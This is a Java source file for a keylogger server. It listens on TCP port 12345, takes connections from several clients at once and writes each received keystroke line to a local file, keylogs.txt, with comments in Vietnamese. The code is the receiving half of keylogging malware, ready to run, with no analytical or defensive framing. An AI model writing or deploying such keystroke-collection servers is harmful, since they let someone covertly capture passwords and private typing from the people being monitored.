package com.server.liveowl.Keylogger;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class ServerKeylogger {
    private static final int PORT = 12345;

    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("Current working directory: " + System.getProperty("user.dir"));
            System.out.println("Server is listening on port " + PORT);

            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("New client connected");

                // Tạo một thread để xử lý nhiều client đồng thời
                new Thread(() -> {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                         FileWriter writer = new FileWriter("keylogs.txt", true)) {

                        String keyStroke;
                        while ((keyStroke = reader.readLine()) != null) {
                            writer.write(keyStroke);
                            writer.flush(); // Ghi lập tức vào file
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

